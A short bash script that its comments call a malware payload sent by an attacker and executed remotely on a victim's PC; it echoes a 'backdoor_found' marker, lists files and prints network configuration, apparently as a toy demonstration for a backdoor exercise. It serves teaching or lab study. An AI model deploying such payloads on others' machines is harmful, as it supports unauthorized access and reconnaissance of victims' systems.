#!/bin/bash
#This is the malware file, sent by the attacker into the victim's PC and executed remotely.
#This contains the instructions to be executed on the command line that can retrieve sensitive information on the machine of the victim.
#This is only an example, it is possible also to execute applications.

echo "backdoor_found $1"
ls -l
ifconfig
